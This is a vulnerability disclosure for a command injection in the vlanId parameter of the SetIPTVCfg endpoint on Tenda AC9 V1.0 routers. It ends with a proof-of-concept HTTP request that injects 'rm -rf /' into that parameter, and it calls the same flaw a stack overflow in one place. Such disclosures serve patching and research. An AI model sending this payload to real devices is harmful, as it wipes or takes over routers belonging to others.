# Tenda AC9 V1.0 V15.03.05.14_multi Command Injection Vulnerability
## Affected Version
Tenda AC9 V1.0 V15.03.05.14_multi
## Vulnerability Description
In Tenda ac9 v1.0 routers with firmware version V15.03.05.14_multi, the vlanId parameter of route /goform/SetIPTVCfg has a Command Injection Vulnerability, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the formSetIptv function in Tenda AC9 V1.0 firmware V15.03.05.14_multi.This function retrieves the vlanId parameter from a POST request.

![img](./img/SetIPTVCfg1.png)

![img](./img/SetIPTVCfg2.png)

The sub_AFE44 function and the sub_B0030 function, when processing the vlanId parameter, are concatenated to the format string in doSystemCmd and then executed. An attacker can construct the malicious parameter "vlanId" to enable remote code execution.

![img](./img/SetIPTVCfg3.png)

![img](./img/SetIPTVCfg4.png)

## Poc
```py
POST /goform/SetIPTVCfg HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: password=452b97084f53fd461f33687a27a21f4dpxatgb

stbEn=1&igmpEn=1&iptvType=&vlanId=; rm -rf /&list=33,35
```
